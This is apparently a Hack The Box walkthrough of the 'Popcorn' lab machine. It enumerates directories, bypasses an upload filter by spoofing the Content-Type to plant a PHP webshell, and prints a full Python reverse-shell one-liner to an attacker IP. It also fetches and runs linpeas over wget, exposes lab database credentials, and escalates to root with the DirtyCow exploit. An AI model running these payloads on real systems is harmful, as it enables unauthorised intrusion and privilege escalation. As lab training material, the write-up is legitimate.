22 and 80 open

add popcorn.htb to /etc/hosts
running gobuster

```
sudo gobuster dir -u http://popcorn.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gobuster
```

found /test with a phpconfig file. THis file tells us that this box runs popcorn linux, this is some information on popcorn:
https://lkml.org/lkml/2020/4/29/1111

In short, this allows applications to run on distributed hosts, starting on one and migrating to other hosts user the same process and memory space.

The other page I found was /torrent/
http://popcorn.htb/torrent/

We can create an account to inspect this more in depth.

we can see a kali torrent. I tried uploading shells and playing with the extension of the shell but with no success. So I grabbed an ubuntu .torrent file. After uploading this file, I can edit the entry to add a screenshot. So I rename the php shell (since I know this page runs php) and add a .png extension to trick the image check.
This doesn't work tho so let's inspect the request with burp. Changing the content-type to image/png allowed me to upload a webshell. Now we can access this under /torrent/upload/

Using which python shows that I can use python to get a regular reverse shell. Head over to revshells.com and generate one. I used this one:
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.75",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

Now I can grab the user.txt from the home folder of george.
After this, head to /tmp and grab linpeas.sh from the attackbox. we can transfer this via wget. Host a python server where linpeas is located:
```
sudo python3 -m http.server 80
```

Now we can grab and execute like this:
```
wget 10.10.14.75/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

Linpeas found some db credentials:
```
/var/www/torrent/config.php:  $CFG->dbPassword = "SuperSecret!!";       //db password
/var/www/torrent/config.php:  $CFG->dbUserName = "torrent";    //db username

```

But we can't login as george with this. SInce this is a very old box (kernel version from 2009 according to uname -a and linpeas), we can simply run dirtycow on this.

Since which gcc shows that we can run gcc, we can simply compile this on the target machine which makes it easier. Grab the .c file:
```
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
```

After trying some of the exploits, dirty.c worked compiled without issues. We have use some compile options tho (you can find this in the .c file):
https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c

```
gcc -pthread cow.c -o cow -lcrypt
```
Run the cow binary, grab root and we're done.
